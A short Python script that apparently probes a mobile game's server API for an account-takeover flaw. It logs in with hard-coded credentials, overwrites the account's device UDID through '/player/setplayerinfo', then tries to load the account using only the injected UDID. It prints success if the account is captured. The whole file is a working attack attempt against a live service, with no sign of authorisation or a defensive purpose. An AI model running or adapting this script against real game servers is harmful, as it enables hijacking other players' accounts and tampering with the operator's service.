import sys, os, time, requests, json
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..', 'api')))
from fruitcraft_client import FruitClient

def main():
    print('Testing Account Binding Replay...')
    c1 = FruitClient()
    s1, d1 = c1.login('fact11439memory24', 'android_vuln_t1')
    if not s1: return
    
    # Let's see if we can overwrite UDID from the profile settings
    # The game binds restore_key to UDID. But what if we send a new UDID in a post to setplayerinfo?
    print('\n[+] Attempting to overwrite UDID on existing account')
    res = c1.post('/player/setplayerinfo', {'udid': 'hacked_udid_123'})
    print('SetPlayerInfo (UDID):', res)
    
    time.sleep(2)
    # See if the new UDID can login with the old restore key (normally it should, restore key is persistent)
    # But can we fetch it WITHOUT the restore key if we injected the UDID?
    c2 = FruitClient()
    payload = {
        'udid': 'hacked_udid_123',
        'game_version': '1.10.10755',
        'os_type': 2,
        'device_name': 'FruitClient_Bot',
        'os_version': '10',
        'model': 'FruitClient',
        'store_type': 'myket'
    }
    res2 = c2.post('/player/load', payload)
    if res2 and res2.get('status') and res2.get('data', {}).get('name') == 'test/bin/bash001':
        print('[!] SUCCESS! Account taken over via UDID injection')
    else:
        print('[-] FAILED. Server generated new account or rejected.')
        print('Name:', res2.get('data', {}).get('name') if isinstance(res2, dict) else res2)

if __name__ == '__main__':
    main()
